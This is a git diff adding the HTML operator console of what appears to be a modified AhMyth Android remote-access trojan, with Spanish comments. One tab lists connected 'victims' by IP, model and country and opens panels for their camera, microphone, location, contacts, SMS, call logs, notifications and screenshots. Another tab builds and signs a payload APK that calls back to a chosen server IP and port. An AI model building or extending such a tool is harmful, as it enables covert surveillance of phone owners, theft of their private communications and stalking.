@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html ng-app="myappy">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="initial-scale=1, maximum-scale=1" />
+  <title>>Zerset – DevicesLab & APK Builder</title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="assets/css/mystyle.css" />
+  <!-- Leaflet CSS (¡NECESARIO para mostrar el mapa!) -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <link rel="stylesheet" href="node_modules/fomantic-ui/dist/semantic.min.css" />
+
+  <!-- JS libs -->
+  <script src="node_modules/jquery/dist/jquery.min.js"></script>
+  <script src="node_modules/fomantic-ui/dist/semantic.min.js"></script>
+  <script src="node_modules/angular/angular.min.js"></script>
+  <script src="node_modules/angular-route/angular-route.min.js"></script>
+  <script src="assets/js/lib/ng-infinite-scroll.min.js"></script>
+  <!-- Puedes usar la siguiente línea si prefieres Leaflet desde CDN, o tu local si funciona -->
+  <!-- <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script> -->
+  <script src="assets/js/lib/leaflet.js"></script>
+  <script src="/socket.io/socket.io.js"></script>
+
+  <!-- SheetJS para exportar a Excel -->
+  <script src="https://cdn.sheetjs.com/xlsx-0.20.0/package/dist/xlsx.full.min.js"></script>
+
+  <!-- Controladores principales -->
+  <script src="assets/js/controllers/AppCtrl.js"></script>
+  <script src="assets/js/controllers/BuildCtrl.js"></script>
+  <script src="assets/js/controllers/LabCtrl.js"></script>
+  <!-- Componentes LAB -->
+  <script src="assets/js/components/labCalls.js"></script>
+  <!-- <script src="assets/js/components/labCamera.js"></script> --> 
+  <script src="assets/js/components/labContacts.js"></script>
+  <script src="assets/js/components/labMic.js"></script>
+  <script src="assets/js/components/labLocation.js"></script>
+  <script src="assets/js/components/labNotifi.js"></script>
+  <script src="assets/js/components/labSms.js"></script>
+  <script src="assets/js/components/labScreenshot.js"></script>
+
+  <style>
+    #log, #apkLog { height: 180px; overflow:auto; background:#111; color:#fff; padding:8px; }
+    .log .date { display:inline-block; width:25%; }
+    .log .msg  { display:inline-block; width:70%; }
+    .lab-modal { position: fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,.5); z-index:1000; display:flex; align-items:center; justify-content:center; }
+    .lab-card {
+      background:#fff;
+      border-radius:8px;
+      box-shadow:0 4px 24px rgba(0,0,0,.25);
+      width:960px;
+      max-width:97vw;
+      padding:28px 0 0 0;
+      min-height:650px;
+      position:relative;
+      overflow: hidden;
+    }
+    .lab-close { position:absolute; top:16px; right:18px; font-size: 1.5rem; cursor:pointer; color:#444; }
+    .lab-card .ui.menu {
+      flex-wrap: wrap;
+      overflow-x: auto;
+      white-space: nowrap;
+      border-radius: 8px 8px 0 0;
+      box-sizing: border-box;
+      width: 100%;
+    }
+    .lab-card .ui.menu .item {
+      min-width: 110px;
+      text-align: center;
+      font-size: 1rem;
+      box-sizing: border-box;
+    }
+    .lab-card .ui.attached.segment {
+      max-height: 400px;
+      overflow-y: auto;
+    }
+  </style>
+</head>
+<body ng-controller="AppCtrl" class="draggable">
+
+  <!-- Menú de pestañas -->
+  <div class="ui top attached tabular menu">
+    <a class="item active" data-tab="first"><i class="large eye icon"></i> Devices</a>
+    <a class="item" data-tab="second"><i class="large cogs icon"></i> APK Builder</a>
+  </div>
+
+  <!-- Victims Lab (primera pestaña) -->
+  <div class="ui bottom attached tab segment active" data-tab="first">
+    <div class="ui grid">
+      <div class="row">
+        <div class="sixteen wide column">
+          <div class="ui horizontal segments">
+            <div class="ui segment">
+              <h2 class="ui left floated header">
+                <img class="ui image" src="assets/img/VictimsLab.png">
+                <div class="content">Devices LAB</div>
+              </h2>
+            </div>
+            <div class="ui center aligned segment">
+              <div style="line-height: 70px">
+                <div class="ui right floated labeled input">
+                  <div class="ui label">Port</div>
+                  <input type="text" ng-model="port" placeholder="42474">
+                </div>
+                <button ng-click="clearLogs(); Listen(port)" class="ui labeled icon black button">
+                  <i class="terminal icon"></i> Listen
+                </button>
+                <button ng-click="clearLogs(); StopListening(port)" class="ui labeled icon black button">
+                  <i class="terminal icon"></i> Stop
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="row" style="overflow: auto; max-height: 400px;">
+        <div class="sixteen wide column">
+          <table class="ui table single line selectable">
+            <thead>
+              <tr>
+                <th></th>
+                <th>Country</th>
+                <th>Manuf.</th>
+                <th>Model</th>
+                <th>Release</th>
+                <th>IP</th>
+                <th>Port</th>
+                <th></th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr ng-repeat="(key, victim) in victims">
+                <td>
+                  <a class="ui black ribbon label" ng-click="openLab(victim)">Open Lab</a>
+                </td>
+                <td ng-if="victim.country"><i class="{{victim.country}} flag"></i></td>
+                <td ng-if="!victim.country"><i class="help circle icon"></i></td>
+                <td ng-bind="victim.manf"></td>
+                <td ng-bind="victim.model"></td>
+                <td ng-bind="victim.release"></td>
+                <td ng-bind="victim.ip"></td>
+                <td ng-bind="victim.port"></td>
+                <td></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <div id="log" class="ui bottom attached black message">
+      <div ng-repeat="log in logs" class="log">
+        <span class="date" ng-bind="log.date"></span>
+        <span class="msg" ng-bind="log.msg"></span>
+      </div>
+    </div>
+
+    <!-- Modal LAB - reestructurado: NO ng-switch, SÍ ng-show -->
+    <div class="lab-modal" ng-show="labModalOpen && selectedVictim">
+      <div class="lab-card" ng-controller="LabCtrl">
+        <span class="lab-close" ng-click="close()">×</span>
+        <div class="ui top attached tabular menu">
+          <a class="item" ng-class="{'active': labTab==='camera'}" ng-click="labTab='camera'"><i class="red photo icon"></i> Camera</a>
+          <a class="item" ng-class="{'active': labTab==='mic'}" ng-click="labTab='mic'"><i class="blue unmute icon"></i> Mic</a>
+          <a class="item" ng-class="{'active': labTab==='location'}" ng-click="labTab='location'"><i class="violet marker icon"></i> Location</a>
+          <a class="item" ng-class="{'active': labTab==='contacts'}" ng-click="labTab='contacts'"><i class="purple users icon"></i> Contacts</a>
+          <a class="item" ng-class="{'active': labTab==='sms'}" ng-click="labTab='sms'"><i class="grey talk outline icon"></i> SMS</a>
+          <a class="item" ng-class="{'active': labTab==='calls'}" ng-click="labTab='calls'"><i class="black call icon"></i> Calls Logs</a>
+          <a class="item" ng-class="{'active': labTab==='notifications'}" ng-click="labTab='notifications'"><i class="pink bell icon"></i> Notifications</a>
+          <a class="item" ng-class="{'active': labTab==='screenshot'}" ng-click="labTab='screenshot'"><i class="orange camera icon"></i> Screenshot</a>
+        </div>
+        <div class="ui attached segment">
+          <!-- CÁMARA -->
+          <div ng-show="labTab==='camera'">
+            <div class="ui segment">
+              <h2 class="ui header">Cámara</h2>
+              <!-- ...código existente de cámara... -->
+            </div>
+          </div>
+          <!-- MIC -->
+          <div ng-show="labTab==='mic'">
+            <lab-mic victim="selectedVictim"></lab-mic>
+          </div>
+          <div ng-show="labTab==='location'">
+            <lab-location victim="selectedVictim"></lab-location>
+          </div>
+          <div ng-show="labTab==='contacts'">
+            <lab-contacts 
+              contacts-list="contactsList" 
+              contacts-error="contactsError" 
+              save-contacts="saveContacts()">
+            </lab-contacts>
+          </div>
+          <div ng-show="labTab==='sms'">
+            <lab-sms victim="selectedVictim"></lab-sms>
+          </div>
+          <div ng-show="labTab==='calls'">
+            <lab-calls victim="selectedVictim"></lab-calls>
+          </div>
+          <div ng-show="labTab==='notifications'">
+            <lab-notifi victim="selectedVictim"></lab-notifi>
+          </div>
+          <div ng-show="labTab==='screenshot'">
+            <lab-screenshot victim="selectedVictim"></lab-screenshot>
+          </div>
+        </div>
+        <div id="logy" class="ui bottom attached black message notDraggable">
+          <div ng-repeat="log in logs" class="log">
+            <div class="w30" style="display: inline-block" ng-bind="log.date"></div>
+            <div class="w65" style="display: inline-block" ng-style="{'color':log.color}" ng-bind="log.msg"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- APK Builder (segunda pestaña) -->
+  <div class="ui bottom attached tab segment" data-tab="second">
+    <!-- BEGIN: build.html inlined -->
+    <div ng-controller="BuildCtrl" class="ui container" style="padding: 1em;">
+
+      <h3 class="ui dividing header">APK Builder</h3>
+
+      <form class="ui form">
+        <!-- Directorio del proyecto -->
+        <div class="field">
+          <label>Directorio del proyecto</label>
+          <input type="text" ng-model="build.projectDir" placeholder="/Users/jesusverdiguel/AhMyth/Ahmyth-Client">
+          <small>Carpeta donde está tu proyecto de cliente AhMyth</small>
+        </div>
+
+        <!-- Nombre de salida -->
+        <div class="field">
+          <label>Nombre de salida</label>
+          <input type="text" ng-model="build.outputName" placeholder="MythApp">
+          <small>Nombre final de tu APK (sin extensión)</small>
+        </div>
+
+        <!-- Keystore y alias -->
+        <div class="two fields">
+          <div class="field">
+            <label>Keystore (.jks)</label>
+            <input type="text" ng-model="build.keystorePath" placeholder="/ruta/a/tuKeystore.jks">
+            <small>Archivo Java KeyStore para firmar el APK</small>
+          </div>
+          <div class="field">
+            <label>Alias de la clave</label>
+            <input type="text" ng-model="build.keyAlias" placeholder="miAlias">
+            <small>Nombre del par de claves dentro del keystore</small>
+          </div>
+        </div>
+
+        <!-- Contraseñas -->
+        <div class="two fields">
+          <div class="field">
+            <label>Contraseña del Keystore</label>
+            <input type="password" ng-model="build.keystorePassword" placeholder="••••••">
+          </div>
+          <div class="field">
+            <label>Contraseña de la clave</label>
+            <input type="password" ng-model="build.keyPassword" placeholder="••••••">
+          </div>
+        </div>
+
+        <!-- Servidor -->
+        <div class="two fields">
+          <div class="field">
+            <label>Servidor IP</label>
+            <input type="text" ng-model="build.serverIp" placeholder="192.168.1.100">
+          </div>
+          <div class="field">
+            <label>Servidor Puerto</label>
+            <input type="text" ng-model="build.serverPort" placeholder="42474">
+          </div>
+        </div>
+
+        <!-- Permisos: casillas de verificación -->
+        <div class="field">
+          <label>Permisos</label>
+          <div class="ui list">
+            <div class="item" ng-repeat="(key, enabled) in build.perms">
+              <label>
+                <input type="checkbox" ng-model="build.perms[key]" /> {{key}}
+              </label>
+            </div>
+          </div>
+          <small>Marca los permisos que quieras incluir en el APK</small>
+        </div>
+
+        <!-- Botón de construcción -->
+        <button class="ui primary button" ng-click="startBuild()" ng-disabled="building">
+          <i class="cogs icon"></i> Construir APK
+        </button>
+      </form>
+
+      <!-- Indicador de progreso -->
+      <div class="ui segment" ng-show="building" style="margin-top: 1em;">
+        <div class="ui active inline loader"></div> Construyendo...
+      </div>
+
+      <!-- Logs de build -->
+      <div id="apkLog" class="ui segment" style="height:200px; overflow:auto; margin-top:1em;" ng-show="apkLogs.length">
+        <div ng-repeat="line in apkLogs track by $index">{{line}}</div>
+      </div>
+
+      <!-- Enlace al APK generado -->
+      <div class="ui positive message" ng-show="apkLink" style="margin-top:1em;">
+        <i class="download icon"></i>
+        APK listo: <a ng-href="{{apkLink}}" target="_blank">{{apkLink}}</a>
+         <a ng-href="{{ apkLink }}"
+         download="{{ build.outputName }}.apk"
+         target="_blank">
+         Descargar APK
+        </a>
+      </div>
+    </div>
+
+    <!-- Inicializar Semantic UI checkbox -->
+    <script>
+      $('.ui.checkbox').checkbox();
+    </script>
+    <!-- END: build.html inlined -->
+    <div id="apkLog" class="ui bottom attached black message" ng-show="apkLogs.length">
+      <div ng-repeat="line in apkLogs track by $index">{{line}}</div>
+    </div>
+  </div>
+
+  <script>
+    $('.menu .item').tab();
+  </script>
+</body>
+</html>
